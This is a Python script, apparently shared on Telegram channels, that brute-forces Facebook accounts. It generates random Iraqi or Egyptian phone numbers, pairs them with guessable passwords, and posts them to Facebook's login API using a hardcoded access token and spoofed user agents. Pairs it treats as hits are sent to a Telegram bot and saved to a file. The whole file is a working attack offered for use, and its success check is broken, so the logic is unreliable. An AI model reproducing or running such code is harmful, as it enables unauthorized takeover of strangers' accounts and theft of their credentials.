import webbrowser
webbrowser.open('https://t.me/j_b_i')
import requests, random
from user_agent import generate_user_agent
import webbrowser

class style:
    RED = '\x1b[31m'
    GREEN = '\x1b[32m'
    YELLOW = '\x1b[33m'
    BLUE = '\x1b[34m'


req = requests.session()
print('Hi  Code BY:@N_a_m_0')
webbrowser.open('https://t.me/Pydroid_Tools')
print('1- Iraq\n2- Egypt')
hussain = int(input('Choose Your Contry : '))
ID = str(input('Enter Your ID : '))
TOKN = str(input('Enter Your token : '))
ur = 'https://api.facebook.com/method/auth.login'
haeders = {'user-agent':str(generate_user_agent()), 
 'Accept-Language':'en-US,en;q=0.5'}

def eg():
    while True:
        us1 = '1234567890'
        user1 = ''.join((random.choice(us1) for x in range(7)))
        user2 = '+964' + "770" +user1
        pass5 = '0770'
        pas2 = pass5+user1
        data = {'email':user2, 
         'password':pas2, 
         'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
         'locale':'en_DZ',  'format':'JSON'}
        rx = req.post(ur, headers=haeders, data=data).json()
        if 'Invalid username or email address (400)' or 'Invalid username or email address (400)' in rx:
            print(style.RED, 'Error', user2, ':', pas2)
        else:
            m = (
             'Hi Hunt ACC ~~~~', user2, ':', pas2, ' Channel: @Pydroid_Tools  My: @N_a_m_0')
            requests.get(f"https://api.telegram.org/bot{TOKN}/sendMessage?chat_id={ID}&text={m}")
            print(style.GREEN, 'Hunt ACC', user2, ':', pas2)
            with open('ANBARY.txt', 'a') as (i):
                i.write(user2, ':' + pas2 + '\n')


def iq():
    while True:
        us3 = '1234567890'
        userx = ''.join((random.choice(us3) for x in range(7)))
        zc = ('+96477', '+96475', '+96478')
        zh = random.choice(zc)
        user3 = zh + userx
        pasx = ('1122334455', '19981999', '20012002', '07800780', '12344321')
        pas3 = random.choice(pasx)
        data = {'email':user3, 
         'password':pas3, 
         'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
         'locale':'en_DZ',  'format':'JSON'}
        rx = req.post(ur, headers=haeders, data=data).json()
        if 'Invalid username or email address (400)' or 'Invalid username or email address (400)' in rx:
            print(style.RED, 'Error', user3 + ':' + pas3)
        else:
            print(style.GREEN, 'Hunt ACC' + user3 + ':' + pas3)
            m = 'Hi Hunt ACC ~~~~' + user3 + ':' + pas3 + ' Channel: @Pydroid_Tools  My: @N_a_m_0'
            requests.get(f"https://api.telegram.org/bot{TOKN}/sendMessage?chat_id={ID}&text={m}")
            with open('NURY.txt', 'a') as (i):
                i.write(user3 + ':' + pas3 + '\n')


if hussain == 1:
    iq()
else:
    if hussain == 2:
        eg()
    else:
        exit()



